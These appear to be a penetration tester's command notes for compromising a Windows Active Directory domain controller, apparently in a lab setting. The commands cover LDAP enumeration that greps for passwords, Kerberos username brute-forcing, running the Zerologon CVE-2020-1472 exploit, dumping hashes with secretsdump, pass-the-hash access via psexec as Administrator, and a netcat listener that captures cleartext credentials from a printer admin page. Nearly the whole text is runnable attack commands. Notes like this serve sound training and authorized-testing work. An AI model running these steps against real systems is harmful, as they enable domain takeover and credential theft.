#### windapsearch.py

```bash - kali
cd /opt && sudo git clone https://github.com/ropnop/windapsearch
```

```bash - kali
sudo apt install python3-ldap
```

```bash - kali
cd windapsearch && ./windapsearch.py -d resolute.domain.local --dc-ip $TARGET -U
```

```bash - kali
./windapsearch.py -d resolute.domain.local --dc-ip $TARGET -U --full | grep Password
```

```bash - kali
./windapsearch.py -d resolute.domain.local --dc-ip $TARGET -U > users
```

#### ldapsearch
```bash - kali
ldapsearch -x -p 389 -h $TARGET -b "dc=$HOSTNAME,dc=$DOMAIN_NAME" -s sub "*" | grep -i "description"
```

```bash - kali
ldapsearch -x -p 389 -h $TARGET -b "dc=$HOSTNAME,dc=$DOMAIN_NAME" -s sub "*" | grep -i "password"
```

```bash - kali
ldapsearch -x -p 389 -h $TARGET -b "dc=$HOSTNAME,dc=$DOMAIN_NAME" -s sub "*" > ldapsearch.txt
```

![[Pasted image 20220114104148.png]]

0 means "no lock out policy"

Script to verify user's creds:

##### zerologon
```bash - kali
git clone https://github.com/SecuraBV/CVE-2020-1472
```

```bash - kali
cd CVE-2020-1472 && pip install -r requirements.txt
```

Next, look at the nmap results below to find the CN value:

```bash - kali
tcp_389_ldap_nmap.txt
```

![[Pasted image 20220105211456.png]]

```bash - kali
python3 zerologon_tester.py $DOMAIN_NAME $TARGET
```

![[Pasted image 20220105211656.png]]

```bash - kali
/opt/enum4linux-ng/enum4linux-ng.py $TARGET -A -C
```
  
Now add the target to the hosts file:

```bash - kali
sudo echo '$TARGET $DOMAIN' | sudo tee -a /etc/hosts
```

```bash - kali
sudo apt install golang
```

```bash - kali
go get github.com/ropnop/kerbrute
```

```bash - kali
cd kerbrute
```

```bash - kali
make linux
```

```bash - kali
cd dist
```

```bash - kali
./kerbrute_linux_amd64 userenum -d $DOMAIN --dc $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

```bash - kali
git clone https://github.com/dirkjanm/CVE-2020-1472
```

```bash - kali
cd CVE-2020-1472
```

```bash - kali
sudo python3 cve-2020-1472-exploit.py $DOMAIN_CONTROLLER_NAME $TARGET
```

   
```bash - kali
secretsdump.py -hashes :$HASH '$DOMAIN/$DOMAIN_CONTROLLER_NAME@$TARGET'
```

Using empty LM hash:
```bash - kali
psexec.py Administrator@$TARGET -hashes aad3b435b51404eeaad3b435b51404ee:$HASH
```


#### Printer Admin Page

```bash - kali
sudo rlwrap -cAr nc -lvnp 389
```

Navigate to settings page:

![[Pasted image 20220218175015.png]]

Enter your Kali IP in the Server Address field.

Click update, get clear text creds in listener.



